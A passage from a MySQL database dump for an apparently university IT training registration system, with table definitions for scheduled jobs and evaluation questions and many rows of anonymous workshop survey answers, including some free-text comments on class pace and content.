-- Dumping data for table `oit_tbl_ot_bug_text`
--


-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_cron_status`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_cron_status` (
  `name` varchar(255) NOT NULL DEFAULT '',
  `status` enum('enabled','disabled') NOT NULL DEFAULT 'enabled',
  `lastRunDt` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `oit_tbl_ot_cron_status`
--

INSERT INTO `oit_tbl_ot_cron_status` (`name`, `status`, `lastRunDt`) VALUES
('email-queue', 'enabled', 0),
('workshop-evaluation-reminder', 'enabled', 1256216722),
('workshop-signup-low-attendance', 'enabled', 0),
('workshop-signup-reminder', 'enabled', 1254492732);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_custom_attribute`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_custom_attribute` (
  `attributeId` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `objectId` varchar(64) NOT NULL DEFAULT '',
  `label` text NOT NULL,
  `type` enum('text','textarea','radio','checkbox','select','ranking','multicheckbox','multiselect') CHARACTER SET utf8 NOT NULL DEFAULT 'text',
  `options` text NOT NULL,
  `required` binary(1) NOT NULL DEFAULT '\0',
  `direction` enum('vertical','horizontal') NOT NULL DEFAULT 'vertical',
  `order` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`attributeId`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=40 ;

--
-- Dumping data for table `oit_tbl_ot_custom_attribute`
--

INSERT INTO `oit_tbl_ot_custom_attribute` (`attributeId`, `objectId`, `label`, `type`, `options`, `required`, `direction`, `order`) VALUES
(24, 'evaluations', 'Overall, I was satisfied with this workshop', 'radio', 'a:4:{i:0;s:14:"Strongly Agree";i:1;s:5:"Agree";i:2;s:8:"Disagree";i:3;s:17:"Strongly Disagree";}', '\0', 'vertical', 4),
(25, 'evaluations', 'The instructor demonstrated knowledge and expertise on the subject', 'radio', 'a:4:{i:0;s:14:"Strongly Agree";i:1;s:5:"Agree";i:2;s:8:"Disagree";i:3;s:17:"Strongly Disagree";}', '\0', 'vertical', 6),
(26, 'evaluations', 'The instructor answered questions effectively and clearly', 'radio', 'a:4:{i:0;s:14:"Strongly Agree";i:1;s:5:"Agree";i:2;s:8:"Disagree";i:3;s:17:"Strongly Disagree";}', '\0', 'vertical', 7),
(27, 'evaluations', 'The instructor presented information in an organized manner', 'radio', 'a:4:{i:0;s:14:"Strongly Agree";i:1;s:5:"Agree";i:2;s:8:"Disagree";i:3;s:17:"Strongly Disagree";}', '\0', 'vertical', 8),
(28, 'evaluations', 'The pace of instruction was', 'radio', 'a:3:{i:0;s:8:"Too Fast";i:1;s:8:"Too Slow";i:2;s:11:"About Right";}', '\0', 'vertical', 9),
(30, 'evaluations', 'The duration of this workshop was', 'radio', 'a:3:{i:0;s:8:"Too Long";i:1;s:9:"Too Short";i:2;s:11:"About Right";}', '\0', 'vertical', 10),
(31, 'evaluations', 'Complete this sentence: As a result of this workshop, my knowledge and skills in this subject matter has', 'radio', 'a:3:{i:0;s:15:"increased a lot";i:1;s:18:"increased a little";i:2;s:27:"not increased significantly";}', '\0', 'vertical', 11),
(32, 'evaluations', 'I will be able to apply the knowledge I learned', 'radio', 'a:5:{i:0;s:14:"Strongly Agree";i:1;s:5:"Agree";i:2;s:8:"Disagree";i:3;s:17:"Strongly Disagree";i:4;s:26:"Neither Agree nor Disagree";}', '\0', 'vertical', 12),
(33, 'evaluations', 'The training will help me do my job better', 'radio', 'a:5:{i:0;s:14:"Strongly Agree";i:1;s:5:"Agree";i:2;s:8:"Disagree";i:3;s:17:"Strongly Disagree";i:4;s:26:"Neither Agree nor Disagree";}', '\0', 'vertical', 13),
(34, 'evaluations', 'The instructor met the objectives for the workshop', 'radio', 'a:5:{i:0;s:14:"Strongly Agree";i:1;s:5:"Agree";i:2;s:8:"Disagree";i:3;s:17:"Strongly Disagree";i:4;s:26:"Neither Agree nor Disagree";}', '\0', 'vertical', 5),
(35, 'evaluations', 'I would recommend this workshops to others', 'radio', 'a:4:{i:0;s:14:"Strongly Agree";i:1;s:5:"Agree";i:2;s:8:"Disagree";i:3;s:17:"Strongly Disagree";}', '\0', 'vertical', 14),
(36, 'evaluations', 'Please take a moment to tell us how we can make this workshop better.', 'textarea', '', '\0', 'vertical', 15),
(37, 'evaluations', 'Please share any suggestions for improvement or issues of concern regarding our new ClassMate registration system.', 'textarea', '', '\0', 'vertical', 3),
(38, 'evaluations', 'The new ClassMate registration system was simple and easy to use', 'radio', 'a:4:{i:0;s:14:"Strongly Agree";i:1;s:5:"Agree";i:2;s:8:"Disagree";i:3;s:17:"Strongly Disagree";}', '\0', 'vertical', 1),
(39, 'evaluations', 'The email notifications provide me with the information I needed to be prepared for this workshop', 'radio', 'a:5:{i:0;s:14:"Strongly Agree";i:1;s:5:"Agree";i:2;s:8:"Disagree";i:3;s:17:"Strongly Disagree";i:4;s:26:"Neither Agree nor Disagree";}', '\0', 'vertical', 2);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_ot_custom_attribute_value`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_ot_custom_attribute_value` (
  `objectId` varchar(64) NOT NULL DEFAULT '',
  `parentId` varchar(255) NOT NULL DEFAULT '',
  `attributeId` int(11) NOT NULL DEFAULT '0',
  `value` text NOT NULL,
  PRIMARY KEY (`objectId`,`parentId`,`attributeId`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `oit_tbl_ot_custom_attribute_value`
--

INSERT INTO `oit_tbl_ot_custom_attribute_value` (`objectId`, `parentId`, `attributeId`, `value`) VALUES
('evaluations', '100', 36, ''),
('evaluations', '100', 37, ''),
('evaluations', '100', 38, '0'),
('evaluations', '101', 36, ''),
('evaluations', '101', 37, ''),
('evaluations', '101', 38, '0'),
('evaluations', '102', 24, '0'),
('evaluations', '102', 25, '0'),
('evaluations', '102', 26, '0'),
('evaluations', '102', 27, '0'),
('evaluations', '102', 28, '2'),
('evaluations', '102', 30, '2'),
('evaluations', '102', 31, '0'),
('evaluations', '102', 32, '0'),
('evaluations', '102', 33, '0'),
('evaluations', '102', 34, '0'),
('evaluations', '102', 35, '0'),
('evaluations', '102', 36, ''),
('evaluations', '102', 37, ''),
('evaluations', '102', 38, '1'),
('evaluations', '102', 39, '0'),
('evaluations', '103', 24, '0'),
('evaluations', '103', 25, '0'),
('evaluations', '103', 26, '0'),
('evaluations', '103', 27, '0'),
('evaluations', '103', 28, '2'),
('evaluations', '103', 30, '2'),
('evaluations', '103', 31, '0'),
('evaluations', '103', 32, '0'),
('evaluations', '103', 33, '0'),
('evaluations', '103', 34, '0'),
('evaluations', '103', 35, '0'),
('evaluations', '103', 36, ''),
('evaluations', '103', 37, 'none'),
('evaluations', '103', 38, '1'),
('evaluations', '103', 39, '0'),
('evaluations', '104', 24, '0'),
('evaluations', '104', 25, '0'),
('evaluations', '104', 26, '0'),
('evaluations', '104', 27, '0'),
('evaluations', '104', 28, '2'),
('evaluations', '104', 30, '2'),
('evaluations', '104', 31, '0'),
('evaluations', '104', 32, '1'),
('evaluations', '104', 33, '1'),
('evaluations', '104', 34, '0'),
('evaluations', '104', 35, '0'),
('evaluations', '104', 36, ''),
('evaluations', '104', 37, ''),
('evaluations', '104', 38, '1'),
('evaluations', '104', 39, '1'),
('evaluations', '105', 24, '0'),
('evaluations', '105', 25, '0'),
('evaluations', '105', 26, '0'),
('evaluations', '105', 27, '2'),
('evaluations', '105', 28, '2'),
('evaluations', '105', 30, '2'),
('evaluations', '105', 31, '1'),
('evaluations', '105', 32, '1'),
('evaluations', '105', 33, '1'),
('evaluations', '105', 34, '0'),
('evaluations', '105', 35, '1'),
('evaluations', '105', 36, ''),
('evaluations', '105', 37, ''),
('evaluations', '105', 38, '0'),
('evaluations', '105', 39, '0'),
('evaluations', '106', 24, '0'),
('evaluations', '106', 25, '0'),
('evaluations', '106', 26, '0'),
('evaluations', '106', 27, '0'),
('evaluations', '106', 28, '2'),
('evaluations', '106', 30, '2'),
('evaluations', '106', 31, '0'),
('evaluations', '106', 32, '0'),
('evaluations', '106', 33, '0'),
('evaluations', '106', 34, '0'),
('evaluations', '106', 35, '0'),
('evaluations', '106', 36, ''),
('evaluations', '106', 37, ''),
('evaluations', '106', 38, '0'),
('evaluations', '106', 39, '1'),
('evaluations', '107', 24, '0'),
('evaluations', '107', 25, '0'),
('evaluations', '107', 26, '0'),
('evaluations', '107', 27, '0'),
('evaluations', '107', 28, '2'),
('evaluations', '107', 30, '2'),
('evaluations', '107', 31, '0'),
('evaluations', '107', 32, '0'),
('evaluations', '107', 33, '0'),
('evaluations', '107', 34, '0'),
('evaluations', '107', 35, '0'),
('evaluations', '107', 36, ''),
('evaluations', '107', 37, ''),
('evaluations', '107', 38, '0'),
('evaluations', '107', 39, '0'),
('evaluations', '108', 24, '1'),
('evaluations', '108', 25, '0'),
('evaluations', '108', 26, '1'),
('evaluations', '108', 27, '1'),
('evaluations', '108', 28, '2'),
('evaluations', '108', 30, '2'),
('evaluations', '108', 31, '0'),
('evaluations', '108', 32, '1'),
('evaluations', '108', 33, '1'),
('evaluations', '108', 34, '1'),
('evaluations', '108', 35, '1'),
('evaluations', '108', 36, ''),
('evaluations', '108', 37, ''),
('evaluations', '108', 38, '1'),
('evaluations', '108', 39, '1'),
('evaluations', '109', 24, '0'),
('evaluations', '109', 25, '0'),
('evaluations', '109', 26, '1'),
('evaluations', '109', 27, '1'),
('evaluations', '109', 28, '2'),
('evaluations', '109', 30, '1'),
('evaluations', '109', 31, '1'),
('evaluations', '109', 32, '1'),
('evaluations', '109', 33, '1'),
('evaluations', '109', 34, '0'),
('evaluations', '109', 35, '1'),
('evaluations', '109', 36, ''),
('evaluations', '109', 37, ''),
('evaluations', '109', 39, '1'),
('evaluations', '111', 24, '0'),
('evaluations', '111', 25, '0'),
('evaluations', '111', 26, '0'),
('evaluations', '111', 27, '0'),
('evaluations', '111', 28, '2'),
('evaluations', '111', 30, '2'),
('evaluations', '111', 31, '1'),
('evaluations', '111', 32, '0'),
('evaluations', '111', 33, '1'),
('evaluations', '111', 34, '0'),
('evaluations', '111', 35, '0'),
('evaluations', '111', 36, ''),
('evaluations', '111', 37, ''),
('evaluations', '111', 38, '0'),
('evaluations', '111', 39, '1'),
('evaluations', '112', 24, '0'),
('evaluations', '112', 25, '0'),
('evaluations', '112', 26, '0'),
('evaluations', '112', 27, '0'),
('evaluations', '112', 28, '2'),
('evaluations', '112', 30, '2'),
('evaluations', '112', 31, '0'),
('evaluations', '112', 32, '0'),
('evaluations', '112', 33, '0'),
('evaluations', '112', 34, '0'),
('evaluations', '112', 35, '0'),
('evaluations', '112', 36, 'quite excellent as is. facilities not that great (projector didn''t work with Mac laptop)'),
('evaluations', '112', 37, ''),
('evaluations', '112', 38, '0'),
('evaluations', '112', 39, '0'),
('evaluations', '113', 24, '0'),
('evaluations', '113', 25, '0'),
('evaluations', '113', 26, '0'),
('evaluations', '113', 27, '0'),
('evaluations', '113', 28, '2'),
('evaluations', '113', 30, '1'),
('evaluations', '113', 31, '0'),
('evaluations', '113', 32, '0'),
('evaluations', '113', 33, '1'),
('evaluations', '113', 34, '0'),
('evaluations', '113', 35, '1'),
('evaluations', '113', 36, ''),
('evaluations', '113', 37, ''),
('evaluations', '113', 38, '0'),
('evaluations', '113', 39, '0'),
('evaluations', '114', 24, '0'),
('evaluations', '114', 25, '0'),
('evaluations', '114', 26, '0'),
('evaluations', '114', 27, '1'),
('evaluations', '114', 28, '2'),
('evaluations', '114', 30, '2'),
('evaluations', '114', 31, '1'),
('evaluations', '114', 32, '1'),
('evaluations', '114', 33, '1'),
('evaluations', '114', 34, '0'),
('evaluations', '114', 35, '0'),
('evaluations', '114', 36, ''),
('evaluations', '114', 37, ''),
('evaluations', '114', 38, '0'),
('evaluations', '114', 39, '2'),
('evaluations', '115', 24, '0'),
('evaluations', '115', 25, '0'),
('evaluations', '115', 26, '0'),
('evaluations', '115', 27, '0'),
('evaluations', '115', 28, '2'),
('evaluations', '115', 30, '1'),
('evaluations', '115', 31, '0'),
('evaluations', '115', 32, '0'),
('evaluations', '115', 33, '0'),
('evaluations', '115', 34, '0'),
('evaluations', '115', 35, '0'),
('evaluations', '115', 36, ''),
('evaluations', '115', 37, ''),
('evaluations', '115', 38, '0'),
('evaluations', '115', 39, '0'),
('evaluations', '116', 24, '1'),
('evaluations', '116', 25, '0'),
('evaluations', '116', 26, '0'),
('evaluations', '116', 27, '1'),
('evaluations', '116', 28, '2'),
('evaluations', '116', 30, '2'),
('evaluations', '116', 31, '1'),
('evaluations', '116', 32, '1'),
('evaluations', '116', 33, '1'),
('evaluations', '116', 34, '1'),
('evaluations', '116', 35, '1'),
('evaluations', '116', 36, ''),
('evaluations', '116', 37, ''),
('evaluations', '116', 38, '0'),
('evaluations', '116', 39, '0'),
('evaluations', '117', 24, '0'),
('evaluations', '117', 25, '0'),
('evaluations', '117', 26, '0'),
('evaluations', '117', 27, '0'),
('evaluations', '117', 28, '2'),
('evaluations', '117', 30, '2'),
('evaluations', '117', 31, '0'),
('evaluations', '117', 32, '0'),
('evaluations', '117', 33, '0'),
('evaluations', '117', 34, '0'),
('evaluations', '117', 35, '0'),
('evaluations', '117', 36, 'great job! would be nice to have more of these that will focus individually on installation and administration of server roles and features'),
('evaluations', '117', 37, ''),
('evaluations', '117', 38, '1'),
('evaluations', '117', 39, '0'),
('evaluations', '118', 24, '0'),
('evaluations', '118', 25, '0'),
('evaluations', '118', 26, '0'),
('evaluations', '118', 27, '0'),
('evaluations', '118', 28, '2'),
('evaluations', '118', 30, '2'),
('evaluations', '118', 31, '0'),
('evaluations', '118', 32, '0'),
('evaluations', '118', 33, '1'),
('evaluations', '118', 34, '0'),
('evaluations', '118', 35, '0'),
('evaluations', '118', 36, ''),
('evaluations', '118', 37, ''),
('evaluations', '118', 38, '0'),
('evaluations', '118', 39, '1'),
('evaluations', '119', 24, '0'),
('evaluations', '119', 25, '0'),
('evaluations', '119', 26, '0'),
('evaluations', '119', 27, '0'),
('evaluations', '119', 28, '2'),
('evaluations', '119', 30, '1'),
('evaluations', '119', 31, '1'),
('evaluations', '119', 32, '4'),
('evaluations', '119', 33, '4'),
('evaluations', '119', 34, '0'),
('evaluations', '119', 35, '1'),
('evaluations', '119', 36, 'I thought the workshop was fine; I just wanted to clarify a little on the last couple of answers. As an introductory class it gave us a feel for the breadth and depth of the AD environment, but not much in the way of using those tools which is why I answered ''neither agree/disagree'' to the last few questions. I expect the next class (AD Administration) will start providing us with some of the implementation knowledge/skills that will allow us to better perform out jobs.'),
('evaluations', '119', 37, ''),
('evaluations', '119', 38, '0'),
('evaluations', '119', 39, '0'),
('evaluations', '120', 24, '1'),
('evaluations', '120', 25, '0'),
('evaluations', '120', 26, '1'),
('evaluations', '120', 27, '1'),
('evaluations', '120', 28, '1'),
('evaluations', '120', 30, '2'),
('evaluations', '120', 31, '0'),
('evaluations', '120', 32, '4'),
('evaluations', '120', 33, '4'),
('evaluations', '120', 34, '1'),
('evaluations', '120', 35, '1'),
('evaluations', '120', 36, ''),
('evaluations', '120', 37, ''),
('evaluations', '120', 38, '1'),
('evaluations', '120', 39, '1'),
('evaluations', '121', 24, '0'),
('evaluations', '121', 25, '0'),
('evaluations', '121', 26, '0'),
('evaluations', '121', 27, '0'),
('evaluations', '121', 28, '2'),
('evaluations', '121', 30, '1'),
('evaluations', '121', 31, '0'),
('evaluations', '121', 32, '1'),
('evaluations', '121', 33, '1'),
('evaluations', '121', 34, '0'),
('evaluations', '121', 35, '0'),
('evaluations', '121', 36, ''),
('evaluations', '121', 37, ''),
('evaluations', '121', 38, '0'),
('evaluations', '121', 39, '0'),
('evaluations', '122', 24, '0'),
('evaluations', '122', 25, '0'),
('evaluations', '122', 26, '0'),
('evaluations', '122', 27, '1'),
('evaluations', '122', 28, '2'),
('evaluations', '122', 30, '2'),
('evaluations', '122', 31, '1'),
('evaluations', '122', 32, '1'),
('evaluations', '122', 33, '1'),
('evaluations', '122', 34, '0'),
('evaluations', '122', 35, '0'),
('evaluations', '122', 36, ''),
('evaluations', '122', 37, ''),
('evaluations', '122', 38, '1'),
('evaluations', '122', 39, '1'),
('evaluations', '123', 24, '0'),
('evaluations', '123', 25, '0'),
('evaluations', '123', 26, '0'),
('evaluations', '123', 27, '0'),
('evaluations', '123', 28, '2'),
('evaluations', '123', 30, '2'),
('evaluations', '123', 31, '0'),
('evaluations', '123', 32, '0'),
('evaluations', '123', 33, '0'),
('evaluations', '123', 34, '0'),
('evaluations', '123', 35, '0'),
('evaluations', '123', 36, ''),
('evaluations', '123', 37, ''),
('evaluations', '123', 38, '1'),
('evaluations', '123', 39, '0'),
('evaluations', '124', 24, '0'),
('evaluations', '124', 25, '0'),
('evaluations', '124', 26, '0'),
('evaluations', '124', 27, '0'),
('evaluations', '124', 28, '2'),
('evaluations', '124', 30, '2'),
('evaluations', '124', 31, '0'),
('evaluations', '124', 32, '1'),
('evaluations', '124', 33, '1'),
('evaluations', '124', 34, '0'),
('evaluations', '124', 35, '0'),
('evaluations', '124', 36, 'Would like to see some more shortcuts that I am sure were not covered in this Excel overview.'),
('evaluations', '124', 37, ''),
('evaluations', '124', 38, '0'),
('evaluations', '124', 39, '1'),
('evaluations', '125', 24, '0'),
('evaluations', '125', 25, '0'),
('evaluations', '125', 26, '0'),
('evaluations', '125', 27, '0'),
('evaluations', '125', 28, '2'),
('evaluations', '125', 30, '2'),
('evaluations', '125', 31, '0'),
('evaluations', '125', 32, '1'),
('evaluations', '125', 33, '1'),
('evaluations', '125', 34, '0'),
('evaluations', '125', 35, '0'),
('evaluations', '125', 36, ''),
('evaluations', '125', 37, ''),
('evaluations', '125', 38, '1'),
('evaluations', '125', 39, '1'),
('evaluations', '126', 24, '0'),
('evaluations', '126', 25, '0'),
('evaluations', '126', 26, '0'),
('evaluations', '126', 27, '0'),
('evaluations', '126', 28, '2'),
('evaluations', '126', 30, '2'),
('evaluations', '126', 31, '0'),
('evaluations', '126', 32, '0'),
('evaluations', '126', 33, '0'),
('evaluations', '126', 34, '0'),
('evaluations', '126', 35, '0'),
('evaluations', '126', 36, ''),
('evaluations', '126', 37, ''),
('evaluations', '126', 38, '0'),
('evaluations', '126', 39, '0'),
('evaluations', '127', 24, '0'),
('evaluations', '127', 25, '0'),
('evaluations', '127', 26, '0'),
('evaluations', '127', 27, '0'),
('evaluations', '127', 28, '2'),
('evaluations', '127', 30, '2'),
('evaluations', '127', 31, '0'),
('evaluations', '127', 32, '0'),
('evaluations', '127', 33, '0'),
('evaluations', '127', 34, '0'),
('evaluations', '127', 35, '0'),
('evaluations', '127', 36, ''),
('evaluations', '127', 37, ''),
('evaluations', '127', 38, '0'),
('evaluations', '127', 39, '0'),
('evaluations', '128', 24, '1'),
('evaluations', '128', 25, '0'),
('evaluations', '128', 26, '0'),
('evaluations', '128', 27, '1'),
('evaluations', '128', 28, '2'),
('evaluations', '128', 30, '0'),
('evaluations', '128', 31, '2'),
('evaluations', '128', 32, '1'),
('evaluations', '128', 33, '4'),
('evaluations', '128', 34, '1'),
('evaluations', '128', 35, '1'),
('evaluations', '128', 36, 'I came into this workshop already knowing PowerPoint 2007; just wanted to learn what OIT teaches in their workshops, so take my "knowledge gain" with a grain of salt. :)\r\n\r\nThe email confirmation asks you to print and bring the workshop handout, but the handout is 64 pages long, and we didn''t use it at all in the class. Maybe mention in the confirmation email that you don''t have to bring the handout? That''s a lot of paper!\r\n\r\nThanks for the informative workshop.'),
('evaluations', '128', 37, ''),
('evaluations', '128', 38, '0'),
('evaluations', '128', 39, '0'),
('evaluations', '129', 24, '0'),
('evaluations', '129', 25, '0'),
('evaluations', '129', 26, '0'),
('evaluations', '129', 27, '0'),
('evaluations', '129', 28, '2'),
('evaluations', '129', 30, '2'),
('evaluations', '129', 31, '0'),
('evaluations', '129', 32, '1'),
('evaluations', '129', 33, '1'),
('evaluations', '129', 34, '0'),
('evaluations', '129', 35, '0'),
('evaluations', '129', 36, ''),
('evaluations', '129', 37, ''),
('evaluations', '129', 38, '0'),
('evaluations', '129', 39, '0'),
('evaluations', '130', 24, '0'),
('evaluations', '130', 25, '0'),
('evaluations', '130', 26, '0'),
('evaluations', '130', 27, '0'),
('evaluations', '130', 28, '2'),
('evaluations', '130', 30, '2'),
('evaluations', '130', 31, '1'),
('evaluations', '130', 32, '0'),
('evaluations', '130', 33, '4'),
('evaluations', '130', 34, '0'),
('evaluations', '130', 35, '0'),
('evaluations', '130', 36, ''),
('evaluations', '130', 37, ''),
('evaluations', '130', 38, '1'),
('evaluations', '130', 39, '1'),
('evaluations', '131', 24, '0'),
('evaluations', '131', 25, '0'),
('evaluations', '131', 26, '0'),
('evaluations', '131', 27, '0'),
('evaluations', '131', 28, '2'),
('evaluations', '131', 30, '2'),
('evaluations', '131', 31, '0'),
('evaluations', '131', 32, '0'),
('evaluations', '131', 33, '0'),
('evaluations', '131', 34, '0'),
('evaluations', '131', 35, '0'),
('evaluations', '131', 36, ''),
('evaluations', '131', 37, ''),
('evaluations', '131', 38, '0'),
('evaluations', '131', 39, '0'),
('evaluations', '132', 24, '1'),
('evaluations', '132', 25, '1'),
('evaluations', '132', 26, '1'),
('evaluations', '132', 27, '1'),
('evaluations', '132', 28, '1'),
('evaluations', '132', 30, '2'),
('evaluations', '132', 31, '1'),
('evaluations', '132', 32, '1'),
('evaluations', '132', 33, '1'),
('evaluations', '132', 34, '1'),
('evaluations', '132', 35, '1'),
('evaluations', '132', 36, ''),
('evaluations', '132', 37, ''),
('evaluations', '132', 38, '1'),
('evaluations', '132', 39, '1'),
('evaluations', '133', 24, '0'),
('evaluations', '133', 25, '0'),
('evaluations', '133', 26, '0'),
('evaluations', '133', 27, '0'),
('evaluations', '133', 28, '2'),
('evaluations', '133', 30, '2'),
('evaluations', '133', 31, '1'),
('evaluations', '133', 32, '0'),
('evaluations', '133', 33, '0'),
('evaluations', '133', 34, '0'),
('evaluations', '133', 35, '0'),
('evaluations', '133', 36, ''),
('evaluations', '133', 37, ''),
('evaluations', '133', 38, '0'),
('evaluations', '133', 39, '0'),
('evaluations', '134', 24, '0'),
('evaluations', '134', 25, '0'),
('evaluations', '134', 26, '0'),
('evaluations', '134', 27, '0'),
('evaluations', '134', 28, '2'),
('evaluations', '134', 30, '2'),
('evaluations', '134', 31, '0'),
('evaluations', '134', 32, '0'),
('evaluations', '134', 33, '0'),
('evaluations', '134', 34, '0'),
('evaluations', '134', 35, '0'),
('evaluations', '134', 36, ''),
('evaluations', '134', 37, ''),
('evaluations', '134', 38, '0'),
('evaluations', '134', 39, '0'),
('evaluations', '135', 24, '0'),
('evaluations', '135', 25, '0'),
('evaluations', '135', 26, '0'),
('evaluations', '135', 27, '0'),
('evaluations', '135', 28, '2'),
('evaluations', '135', 30, '2'),
('evaluations', '135', 31, '0'),
('evaluations', '135', 32, '1'),
('evaluations', '135', 33, '1'),
('evaluations', '135', 34, '0'),
('evaluations', '135', 35, '0'),
('evaluations', '135', 36, ''),
('evaluations', '135', 37, ''),
('evaluations', '135', 38, '1'),
('evaluations', '135', 39, '1'),
('evaluations', '136', 24, '0'),
('evaluations', '136', 25, '0'),
('evaluations', '136', 26, '0'),
('evaluations', '136', 27, '0'),
('evaluations', '136', 28, '2'),
('evaluations', '136', 30, '2'),
('evaluations', '136', 31, '0'),
('evaluations', '136', 32, '0'),
('evaluations', '136', 33, '1'),
('evaluations', '136', 34, '0'),
('evaluations', '136', 35, '0'),
('evaluations', '136', 36, ''),
('evaluations', '136', 37, ''),
('evaluations', '136', 38, '0'),
('evaluations', '136', 39, '0'),
('evaluations', '137', 24, '0'),
('evaluations', '137', 25, '0'),
('evaluations', '137', 26, '0'),
('evaluations', '137', 27, '0'),
('evaluations', '137', 28, '2'),
('evaluations', '137', 30, '2'),
('evaluations', '137', 31, '1'),
('evaluations', '137', 32, '0'),
('evaluations', '137', 33, '0'),
('evaluations', '137', 34, '0'),
('evaluations', '137', 35, '0'),
('evaluations', '137', 36, 'Having time at the end to work on specific task that  you need help on.  I was lucky and had a super instructor that stayed the extra time.'),
('evaluations', '137', 37, ''),
('evaluations', '137', 38, '0'),
('evaluations', '137', 39, '0'),
('evaluations', '138', 24, '1'),
('evaluations', '138', 25, '1'),
('evaluations', '138', 26, '0'),
('evaluations', '138', 27, '0'),
('evaluations', '138', 28, '2'),
('evaluations', '138', 30, '2'),
('evaluations', '138', 31, '0'),
('evaluations', '138', 32, '1'),
('evaluations', '138', 33, '1'),
('evaluations', '138', 34, '0'),
('evaluations', '138', 35, '1'),
('evaluations', '138', 36, ''),
('evaluations', '138', 37, 'none'),
('evaluations', '138', 38, '0'),
('evaluations', '138', 39, '0'),
('evaluations', '139', 24, '1'),
('evaluations', '139', 25, '0'),
('evaluations', '139', 26, '1'),
('evaluations', '139', 27, '1'),
('evaluations', '139', 28, '2'),
('evaluations', '139', 30, '1'),
('evaluations', '139', 31, '1'),
('evaluations', '139', 32, '4'),
('evaluations', '139', 33, '4'),
('evaluations', '139', 34, '1'),
('evaluations', '139', 35, '1'),
('evaluations', '139', 36, 'While I understand the time constraints, we barely touched the surface of Facebook.  I would have appreciated some sort of handouts since the pace was so fast, I couldn''t take time to take notes on how to do anything that was discussed.'),
('evaluations', '139', 37, ''),
('evaluations', '139', 38, '0'),
('evaluations', '139', 39, '0'),
('evaluations', '140', 24, '1'),
('evaluations', '140', 25, '0'),
('evaluations', '140', 26, '0'),
('evaluations', '140', 27, '0'),
('evaluations', '140', 28, '2'),
('evaluations', '140', 30, '1'),
('evaluations', '140', 31, '0'),
('evaluations', '140', 32, '0'),
('evaluations', '140', 33, '4'),
('evaluations', '140', 34, '0'),
('evaluations', '140', 35, '1'),
('evaluations', '140', 36, ''),
('evaluations', '140', 37, ''),
('evaluations', '140', 38, '0'),
('evaluations', '140', 39, '0'),
('evaluations', '141', 24, '0'),
('evaluations', '141', 25, '0'),
('evaluations', '141', 26, '0'),
('evaluations', '141', 27, '0'),
('evaluations', '141', 28, '2'),
('evaluations', '141', 30, '2'),
('evaluations', '141', 31, '0'),
('evaluations', '141', 32, '0'),
('evaluations', '141', 33, '0'),
('evaluations', '141', 34, '0'),
('evaluations', '141', 35, '0'),
('evaluations', '141', 36, 'This was a good introduction to social networking.  The interface is complicated but can be approached especially about privacy.    Maybe extending the class length starting a noon instead of 12:15 and saying it goes to 1 not 12:45 (a 1 hour class therefore) might help.  The questions and answers were helpful as examples to add to the class material.'),
('evaluations', '141', 37, ''),
('evaluations', '141', 38, '0'),
('evaluations', '141', 39, '0'),
('evaluations', '142', 24, '1'),
('evaluations', '142', 25, '0'),
('evaluations', '142', 26, '1'),
('evaluations', '142', 27, '1'),
('evaluations', '142', 28, '2'),
('evaluations', '142', 30, '2'),
('evaluations', '142', 31, '0'),
('evaluations', '142', 32, '0'),
('evaluations', '142', 33, '4'),
('evaluations', '142', 34, '1'),
('evaluations', '142', 35, '1'),
('evaluations', '142', 36, ''),
('evaluations', '142', 37, ''),
('evaluations', '142', 38, '0'),
('evaluations', '142', 39, '1'),
('evaluations', '143', 24, '1'),
('evaluations', '143', 25, '0'),
('evaluations', '143', 26, '0'),
('evaluations', '143', 27, '0'),
('evaluations', '143', 28, '2'),
('evaluations', '143', 30, '1'),
('evaluations', '143', 31, '0'),
('evaluations', '143', 32, '0'),
('evaluations', '143', 33, '1'),
('evaluations', '143', 34, '0'),
('evaluations', '143', 35, '1'),
('evaluations', '143', 36, 'The class needs to be at a minium of 1 hour.\r\n\r\nThere is a lot going on in Facebook'),
('evaluations', '143', 37, ''),
('evaluations', '143', 38, '0'),
('evaluations', '143', 39, '1'),
('evaluations', '144', 24, '1'),
('evaluations', '144', 25, '1'),
('evaluations', '144', 26, '0'),
('evaluations', '144', 27, '1'),
('evaluations', '144', 28, '2'),
('evaluations', '144', 30, '2'),
('evaluations', '144', 31, '1'),
('evaluations', '144', 32, '1'),
('evaluations', '144', 33, '4'),
('evaluations', '144', 34, '1'),
('evaluations', '144', 35, '1'),
('evaluations', '144', 36, ''),
('evaluations', '144', 37, ''),
('evaluations', '144', 38, '1'),
('evaluations', '144', 39, '1'),
('evaluations', '145', 24, '0'),
('evaluations', '145', 25, '0'),
('evaluations', '145', 26, '0'),
('evaluations', '145', 27, '0'),
('evaluations', '145', 28, '2'),
('evaluations', '145', 30, '2'),
('evaluations', '145', 31, '0'),
('evaluations', '145', 32, '1'),
('evaluations', '145', 33, '4'),
('evaluations', '145', 34, '0'),
('evaluations', '145', 35, '1'),
('evaluations', '145', 36, ''),
('evaluations', '145', 37, ''),
('evaluations', '145', 38, '1'),
('evaluations', '145', 39, '0'),
('evaluations', '146', 24, '0'),
('evaluations', '146', 25, '0'),
('evaluations', '146', 26, '0'),
('evaluations', '146', 27, '0'),
('evaluations', '146', 28, '2'),
('evaluations', '146', 30, '2'),
('evaluations', '146', 31, '0'),
('evaluations', '146', 32, '0'),
('evaluations', '146', 33, '0'),
('evaluations', '146', 34, '0'),
('evaluations', '146', 35, '0'),
('evaluations', '146', 36, ''),
('evaluations', '146', 37, ''),
('evaluations', '146', 38, '0'),
('evaluations', '146', 39, '0'),
('evaluations', '147', 24, '1'),
('evaluations', '147', 25, '1'),
('evaluations', '147', 26, '1'),
('evaluations', '147', 27, '1'),
('evaluations', '147', 28, '2'),
('evaluations', '147', 30, '1'),
('evaluations', '147', 31, '1'),
('evaluations', '147', 32, '1'),
('evaluations', '147', 33, '1'),
('evaluations', '147', 34, '1'),
('evaluations', '147', 35, '1'),
